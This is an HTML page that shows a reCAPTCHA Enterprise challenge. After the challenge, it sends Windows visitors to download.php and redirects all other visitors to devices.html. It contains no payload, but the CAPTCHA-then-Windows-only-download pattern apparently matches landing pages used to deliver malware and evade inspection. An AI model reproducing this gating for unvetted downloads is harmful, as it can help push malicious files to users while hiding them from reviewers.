<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Complete reCAPTCHA</title>
    <style>
        body, html {
            height: 100%;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: Arial, sans-serif;
        }
        .recaptcha-container {
            text-align: center;
        }
    </style>
    <script src="https://www.google.com/recaptcha/enterprise.js" async defer></script>
    <script>
        function redirectUser() {
            // Redirect non-Windows users to devices.html
            const userAgent = navigator.userAgent;
            if (!userAgent.includes("Windows")) {
                window.location.href = "devices.html";
                return true;
            }
            return false;
        }

        function onSubmit(token) {
            // Redirect to download.php after CAPTCHA success, only for Windows users
            if (!redirectUser()) {
                window.location.href = "download.php";
            }
        }
    </script>
</head>
<body>
    <div class="recaptcha-container">
        <form action="" method="POST">
            <div class="g-recaptcha" 
                 data-sitekey="6LdLvs0rAAAAAOTP9C-WvrbdhYsfi_s0Izr4BqgR" 
                 data-callback="onSubmit" 
                 data-action="LOGIN">
            </div>
        </form>
    </div>
</body>
</html>
